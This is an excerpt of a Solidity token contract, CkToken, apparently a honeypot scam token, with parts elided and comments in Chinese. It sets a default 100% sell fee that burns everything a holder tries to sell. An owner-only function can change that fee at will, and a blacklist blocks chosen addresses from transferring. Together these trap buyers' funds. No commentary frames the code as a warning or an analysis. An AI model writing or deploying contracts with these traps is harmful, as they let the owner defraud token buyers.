...
interface IUniswapV2Router02 is IUniswapV2Router01 {
 ...
 contract CkToken is IBEP20, OwnAdmin
{
    ...
    mapping (address => uint256) _ispair;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isMarketPair;
    mapping (address => bool) isblack;

    uint256 public _tranferSellFee = 100; //卖出滑点
    uint256 public _tranferBuyFee = 5; //卖出滑点
    ...
    function black(address addr) public view returns (bool) {
        return isblack[addr];
    }
   ...
   function increaseAllowance(address spender, uint256 addedValue) public  returns (bool) {
    ...
    function setSellFee(uint _fee) external onlyOwner{
        _tranferSellFee = _fee;
    }

    function setispair(address _addr) external onlyOwner {
        _ispair[_addr] = 1;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if(isblack[sender] || isblack[recipient]) {
            revert("error");
        }
    ...
    function takeFee(address sender, address recipient,uint256 amount) private returns (uint256) {
        uint256 feeAmount = 0;
        if(_ispair[recipient] == 1) {//卖出
            if(_tranferSellFee > 0) {
                uint256 FellNum = amount.mul(_tranferSellFee).div(100);
                feeAmount += FellNum;
                _takeFee(sender,burnaddr, FellNum);
            }
        }
        if(_ispair[sender] == 1) { //买入
            if(_tranferBuyFee > 0) {
                uint256 BuyNum = amount.mul(_tranferBuyFee).div(100); //买入
                _takeFee(sender,burnaddr, BuyNum);
                feeAmount += BuyNum;
            }
        }
